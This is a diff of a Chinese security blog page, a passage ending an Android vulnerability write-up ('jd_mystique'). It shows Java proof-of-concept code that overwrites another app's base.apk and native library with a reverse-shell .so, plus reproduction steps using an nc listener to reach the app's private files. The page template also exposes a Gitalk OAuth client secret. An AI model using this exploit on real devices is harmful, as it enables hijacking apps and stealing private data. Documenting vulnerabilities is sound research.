+            <span class="nc">String</span> <span class="n">path</span> <span class="o">=</span> <span class="nc">SystemProperties</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"sys.target.path"</span><span class="o">);</span> <span class="c1">// 获取目标 APP 路径</span>
+            <span class="k">if</span> <span class="o">(</span><span class="nc">TextUtils</span><span class="o">.</span><span class="na">isEmpty</span><span class="o">(</span><span class="n">path</span><span class="o">))</span> <span class="o">{</span>
+                <span class="nc">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="s">"CVE-TEST"</span><span class="o">,</span> <span class="s">"[-]can not get path from 'sys.target.path'"</span><span class="o">);</span>
+            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+                <span class="nc">File</span> <span class="n">rootPath</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">File</span><span class="o">(</span><span class="n">path</span><span class="o">);</span>
+                <span class="nc">File</span> <span class="n">sourceBase</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">File</span><span class="o">(</span><span class="n">getActivity</span><span class="o">().</span><span class="na">getFilesDir</span><span class="o">(),</span> <span class="s">"base.apk"</span><span class="o">);</span>
+                <span class="nc">File</span> <span class="n">targetBase</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">File</span><span class="o">(</span> <span class="n">rootPath</span><span class="o">,</span> <span class="s">"base.apk"</span><span class="o">);</span>
+                <span class="n">copyFile</span><span class="o">(</span><span class="n">sourceBase</span><span class="o">,</span> <span class="n">targetBase</span><span class="o">);</span>
+                <span class="nc">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="s">"CVE-TEST"</span><span class="o">,</span> <span class="s">"[+]replace file: "</span> <span class="o">+</span> <span class="n">targetBase</span><span class="o">.</span><span class="na">getAbsolutePath</span><span class="o">());</span>
+                <span class="nc">File</span> <span class="n">sourceLib</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">File</span><span class="o">(</span><span class="n">getActivity</span><span class="o">().</span><span class="na">getFilesDir</span><span class="o">(),</span> <span class="s">"libreverse_shell.so"</span><span class="o">);</span>
+                <span class="nc">File</span> <span class="n">targetLib</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">File</span><span class="o">(</span><span class="n">rootPath</span><span class="o">,</span><span class="s">"lib/x86_64/librootoperations.so"</span><span class="o">);</span>
+                <span class="n">copyFile</span><span class="o">(</span><span class="n">sourceLib</span><span class="o">,</span> <span class="n">targetLib</span><span class="o">);</span>
+                <span class="nc">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="s">"CVE-TEST"</span><span class="o">,</span> <span class="s">"[+]replace file: "</span> <span class="o">+</span> <span class="n">targetLib</span><span class="o">.</span><span class="na">getAbsolutePath</span><span class="o">());</span>
+                <span class="nc">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="s">"CVE-TEST"</span><span class="o">,</span> <span class="s">"[+]replace done"</span><span class="o">);</span>
+            <span class="o">}</span>
+
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+        <span class="o">}</span>
+    <span class="o">...</span> <span class="o">...</span>
+    <span class="o">}</span>
+
+<span class="o">}</span>
+
+    <span class="kd">private</span> <span class="kt">void</span> <span class="nf">copyFile</span><span class="o">(</span><span class="nc">File</span> <span class="n">source</span><span class="o">,</span> <span class="nc">File</span>  <span class="n">target</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">FileInputStream</span> <span class="n">fosfrom</span> <span class="o">=</span> <span class="k">new</span> <span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">FileInputStream</span><span class="o">(</span><span class="n">source</span><span class="o">);</span>
+            <span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">FileOutputStream</span> <span class="n">fosto</span> <span class="o">=</span> <span class="k">new</span> <span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">FileOutputStream</span><span class="o">(</span><span class="n">target</span><span class="o">);</span>
+            <span class="kt">byte</span> <span class="n">bt</span><span class="o">[]</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="mi">1024</span><span class="o">];</span>
+            <span class="kt">int</span> <span class="n">num</span><span class="o">;</span>
+            <span class="k">while</span> <span class="o">((</span><span class="n">num</span> <span class="o">=</span> <span class="n">fosfrom</span><span class="o">.</span><span class="na">read</span><span class="o">(</span><span class="n">bt</span><span class="o">))</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
+                <span class="n">fosto</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">bt</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="n">num</span><span class="o">);</span>
+            <span class="o">}</span>
+            <span class="n">fosfrom</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+            <span class="n">fosto</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">ex</span><span class="o">)</span> <span class="o">{</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+
+</code></pre></div></div>
+<h4 id="代码">代码</h4>
+
+<p><a href="/assets/code/jd_mystique_code.zip">代码相关</a></p>
+
+<h3 id="复现步骤">复现步骤</h3>
+
+<ol>
+  <li>电脑端开启 nc server，端口为 8888</li>
+  <li>打开开发者选项，触发修改 base.apk 和 librootoperations.so 文件</li>
+  <li>打开目标 APP，执行开启反射 shell 的 so</li>
+  <li>电脑端 nc server 收到连接请求，此时可查询目标 APP 的私有目录</li>
+</ol>
+
+<h3 id="演示">演示</h3>
+
+<video class="videoElement" src="/assets/videos/systemapp-poc.webm" controls="" preload="auto" width="80%" height="100%"></video>
+
+</div><section class="article__sharing d-print-none"></section><div class="d-print-none"><footer class="article__footer"><meta itemprop="dateModified" content="2021-11-21T21:23:00+08:00"><!-- start custom article footer snippet -->
+
+<!-- end custom article footer snippet --><div class="article__reward"><section>
+  <div class="content-play">
+    <p><a href="javascript:void(0)" onclick="dashangToggle()" class="dashang" title="打赏，支持一下"><font color="white">打赏</font></a></p>
+    <div class="hide_box-play"></div>
+    <div class="shang_box-play">
+      <a class="shang_close-play" href="javascript:void(0)" onclick="dashangToggle()" title="关闭"><img src="/assets/pictures/pay/close.jpg" alt="取消" /></a>
+      <div class="shang_tit-play">
+        <p>感谢您的支持!</p>
+      </div>
+      <div class="shang_payimg">
+          <img src="/assets/pictures/pay/alipayimg.jpg" alt="扫码支持" />
+      </div>
+    <div class="shang_payimg">
+          <img src="/assets/pictures/pay/weipayimg.png" alt="扫码支持" />
+      </div>
+      <div class="pay_explain">扫码打赏，您说多少就多少</div>
+      <div class="shang_payselect">
+        <div class="pay_item checked" data-id="alipay">
+          <span class="pay_logo"><img src="/assets/pictures/pay/alipay.jpg" alt="支付宝" /></span>
+        </div>
+        <div class="pay_item" data-id="weipay">
+          <span class="pay_logo"><img src="/assets/pictures/pay/wechat.jpg" alt="微信" /></span>
+        </div>
+      </div>
+      <div class="shang_info-play">
+        <p>打开支付宝或微信扫一扫，即可进行扫码打赏哦</p>
+      </div>
+    </div>
+  </div>
+  <script type="text/javascript">
+  function dashangToggle(){
+    $(".hide_box-play").fadeToggle();
+    $(".shang_box-play").fadeToggle();
+  }
+  </script>
+
+  <div style="text-align:center;margin:50px 0; font:normal 14px/24px 'MicroSoft YaHei';"></div>
+
+
+  <style type="text/css">
+    .content-play{width:80%;margin-top: 20px;margin-bottom: 10px;height:40px;}
+    .hide_box-play{z-index:999;filter:alpha(opacity=50);background:#666;opacity: 0.5;-moz-opacity: 0.5;left:0;top:0;height:99%;width:100%;position:fixed;display:none;}
+    .shang_box-play{width:540px;height:500px;padding:10px;background-color:#fff;border-radius:10px;position:fixed;z-index:1000;left:50%;top:50%;margin-left:-280px;margin-top:-280px;border:1px dotted #dedede;display:none;}
+    .shang_box-play img{border:none;border-width:0;}
+    .dashang{display:block;width:150px;margin:5px auto;height:40px;line-height:25px;padding:10px;background-color:#f72828;color:#fff;text-align:center;text-decoration:none;border-radius:10px;font-weight:bold;font-size:18px;transition: all 0.3s;}
+    .dashang:hover{opacity:0.8;padding:15px;font-size:18px;}
+    .shang_close-play{float:right;display:inline-block;
+      margin-right: 10px;margin-top: 20px;
+    }
+
+    .shang_logo{display:block;text-align:center;margin:20px auto;}
+    .shang_tit-play{width: 100%;height: 75px;text-align: center;line-height: 66px;color: #a3a3a3;font-size: 16px;font-family: 'Microsoft YaHei';margin-top: 7px;margin-right:2px;}
+    .shang_tit-play p{color:#a3a3a3;text-align:center;font-size:16px;}
+    .shang_payimg{width:230px;padding:10px;padding-left: 80px; /*border:6px solid #EA5F00;**/margin:0 auto;border-radius:3px;height:140px;display:inline-block;}
+    .shang_payimg img{display:inline-block;margin-right:10px;float:left;text-align:center;width:140px;height:140px; }
+    .pay_explain{text-align:center;margin:10px auto;font-size:12px;color:#545454;}
+    .shang_payselect{text-align:center;margin:0 auto;margin-top:40px;cursor:pointer;height:60px;width:500px;margin-left:110px;}
+    .shang_payselect .pay_item{display:inline-block;margin-right:140px;float:left;}
+    .shang_info-play{clear:both;}
+    .shang_info-play p,.shang_info-play a{color:#C3C3C3;text-align:center;font-size:12px;text-decoration:none;line-height:2em;}
+  </style>
+
+</section>
+</div><div class="article__subscribe"><div class="subscribe"><i class="fas fa-rss"></i> <a type="application/rss+xml" href="/feed.xml">Subscribe</a></div></div></footer><div class="article__section-navigator clearfix"><div class="previous"><span>PREVIOUS</span><a href="/2020/10/03/selinux_all.html">深入理解 SELinux</a></div><div class="next"><span>NEXT</span><a href="/2021/11/06/download_64_apk.html">如何下载64位的apk？</a></div></div></div>
+
 </div>
 
 <script>(function() {
   var SOURCES = window.TEXT_VARIABLES.sources;
-  function queryString() {
-    // This function is anonymous, is executed immediately and
-    // the return value is assigned to QueryString!
-    var i = 0, queryObj = {}, pair;
-    var queryStr = window.location.search.substring(1);
-    var queryArr = queryStr.split('&');
-    for (i = 0; i < queryArr.length; i++) {
-      pair = queryArr[i].split('=');
-      // If first entry with this name
-      if (typeof queryObj[pair[0]] === 'undefined') {
-        queryObj[pair[0]] = pair[1];
-        // If second entry with this name
-      } else if (typeof queryObj[pair[0]] === 'string') {
-        queryObj[pair[0]] = [queryObj[pair[0]], pair[1]];
-        // If third or later entry with this name
-      } else {
-        queryObj[pair[0]].push(pair[1]);
-      }
-    }
-    return queryObj;
-  }
-
-  var setUrlQuery = (function() {
-    var baseUrl =  window.location.href.split('?')[0];
-    return function(query) {
-      if (typeof query === 'string') {
-        window.history.replaceState(null, '', baseUrl + query);
-      } else {
-        window.history.replaceState(null, '', baseUrl);
-      }
-    };
-  })();
-
   window.Lazyload.js(SOURCES.jquery, function() {
-    var $tags = $('.js-tags');
-    var $articleTags = $tags.find('button');
-    var $tagShowAll = $tags.find('.tag-button--all');
-    var $result = $('.js-result');
-    var $sections = $result.find('section');
-    var sectionArticles = [];
-    var $lastFocusButton = null;
-    var sectionTopArticleIndex = [];
-    var hasInit = false;
+    $(function() {
+      var $this ,$scroll;
+      var $articleContent = $('.js-article-content');
+      var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
+      var scroll = hasSidebar ? '.js-page-main' : 'html, body';
+      $scroll = $(scroll);
 
-    $sections.each(function() {
-      sectionArticles.push($(this).find('.item'));
+      $articleContent.find('.highlight').each(function() {
+        $this = $(this);
+        $this.attr('data-lang', $this.find('code').attr('data-lang'));
+      });
+      $articleContent.find('h1[id], h2[id], h3[id], h4[id], h5[id], h6[id]').each(function() {
+        $this = $(this);
+        $this.append($('<a class="anchor d-print-none" aria-hidden="true"></a>').html('<i class="fas fa-anchor"></i>'));
+      });
+      $articleContent.on('click', '.anchor', function() {
+        $scroll.scrollToAnchor('#' + $(this).parent().attr('id'), 400);
+      });
     });
-
-    function init() {
-      var i, index = 0;
-      for (i = 0; i < $sections.length; i++) {
-        sectionTopArticleIndex.push(index);
-        index += $sections.eq(i).find('.item').length;
-      }
-      sectionTopArticleIndex.push(index);
-    }
-
-    function searchButtonsByTag(_tag/*raw tag*/) {
-      if (!_tag) {
-        return $tagShowAll;
-      }
-      var _buttons = $articleTags.filter('[data-encode="' + _tag + '"]');
-      if (_buttons.length === 0) {
-        return $tagShowAll;
-      }
-      return _buttons;
-    }
-    function buttonFocus(target) {
-      if (target) {
-        target.addClass('focus');
-        $lastFocusButton && !$lastFocusButton.is(target) && $lastFocusButton.removeClass('focus');
-        $lastFocusButton = target;
-      }
-    }
-
-    function tagSelect (tag/*raw tag*/, target) {
-      var result = {}, $articles;
-      var i, j, k, _tag;
-
-      for (i = 0; i < sectionArticles.length; i++) {
-        $articles = sectionArticles[i];
-        for (j = 0; j < $articles.length; j++) {
-          if (tag === '' || tag === undefined) {
-            result[i] || (result[i] = {});
-            result[i][j] = true;
-          } else {
-            var tags = $articles.eq(j).data('tags').split(',');
-            for (k = 0; k < tags.length; k++) {
-              if (tags[k] === tag) {
-                result[i] || (result[i] = {});
-                result[i][j] = true; break;
-              }
-            }
-          }
-        }
-      }
-
-      for (i = 0; i < sectionArticles.length; i++) {
-        result[i] && $sections.eq(i).removeClass('d-none');
-        result[i] || $sections.eq(i).addClass('d-none');
-        for (j = 0; j < sectionArticles[i].length; j++) {
-          if (result[i] && result[i][j]) {
-            sectionArticles[i].eq(j).removeClass('d-none');
-          } else {
-            sectionArticles[i].eq(j).addClass('d-none');
-          }
-        }
-      }
-
-      hasInit || ($result.removeClass('d-none'), hasInit = true);
-
-
-      if (target) {
-        buttonFocus(target);
-        _tag = target.attr('data-encode');
-        if (_tag === '' || typeof _tag !== 'string') {
-          setUrlQuery();
-        } else {
-          setUrlQuery('?tag=' + _tag);
-        }
-      } else {
-        buttonFocus(searchButtonsByTag(tag));
-      }
-    }
-
-    var query = queryString(), _tag = query.tag;
-    init(); tagSelect(_tag);
-    $tags.on('click', 'button', function() {
-      tagSelect($(this).data('encode'), $(this));
-    });
-
   });
 })();
-</script>
-
-</div><section class="page__comments d-print-none"></section></article><!-- start custom main bottom snippet -->
+</script></div><section class="page__comments d-print-none"><!-- fix text color in the input textarea of gitalk -->
+	<style type="text/css">
+		.gitalk-wrapper .gt-header-textarea {
+			color: #333 !important;
+		}
+	</style><div class="gitalk-wrapper" id="js-gitalk-container"></div><script>
+		window.Lazyload.css('https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css');
+		window.Lazyload.js('https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js', function() {
+			var gitalk = new Gitalk({
+				clientID: '6562eeb5a6025aec380d',
+				clientSecret: '130c89e071f37fa46903269095bf95302eba243c',
+				repo: 'liwugang.github.io',
+				owner: 'liwugang',
+				admin: ['liwugang'],
+				id: 'jd_mystique'
+			});
+			gitalk.render('js-gitalk-container');
+		});
+	</script></section></article><!-- start custom main bottom snippet -->
 
 <!-- end custom main bottom snippet --></div>
             </div></div></div><div class="page__footer d-print-none">
@@ -1703,6 +1814,68 @@ window.Lazyload.js([SOURCES.jquery, PAHTS.search_js], function() {
 /*(function () {
 
 })();*/
+</script><script>
+  /* toc must before affix, since affix need to konw toc' height. */(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  var TOC_SELECTOR = window.TEXT_VARIABLES.site.toc.selectors;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    var $window = $(window);
+    var $articleContent = $('.js-article-content');
+    var $tocRoot = $('.js-toc-root'), $col2 = $('.js-col-aside');
+    var toc;
+    var tocDisabled = false;
+    var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
+    var hasToc = $articleContent.find(TOC_SELECTOR).length > 0;
+
+    function disabled() {
+      return $col2.css('display') === 'none' || !hasToc;
+    }
+
+    tocDisabled = disabled();
+
+    toc = $tocRoot.toc({
+      selectors: TOC_SELECTOR,
+      container: $articleContent,
+      scrollTarget: hasSidebar ? '.js-page-main' : null,
+      scroller: hasSidebar ? '.js-page-main' : null,
+      disabled: tocDisabled
+    });
+
+    $window.on('resize', window.throttle(function() {
+      tocDisabled = disabled();
+      toc && toc.setOptions({
+        disabled: tocDisabled
+      });
+    }, 100));
+
+  });
+})();
+(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    var $window = $(window), $pageFooter = $('.js-page-footer');
+    var $pageAside = $('.js-page-aside');
+    var affix;
+    var tocDisabled = false;
+    var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
+
+    affix = $pageAside.affix({
+      offsetBottom: $pageFooter.outerHeight(),
+      scrollTarget: hasSidebar ? '.js-page-main' : null,
+      scroller: hasSidebar ? '.js-page-main' : null,
+      scroll: hasSidebar ? $('.js-page-main').children() : null,
+      disabled: tocDisabled
+    });
+
+    $window.on('resize', window.throttle(function() {
+      affix && affix.setOptions({
+        disabled: tocDisabled
+      });
+    }, 100));
+
+    window.pageAsideAffix = affix;
+  });
+})();
 </script>
     </div>
     <script>(function () {
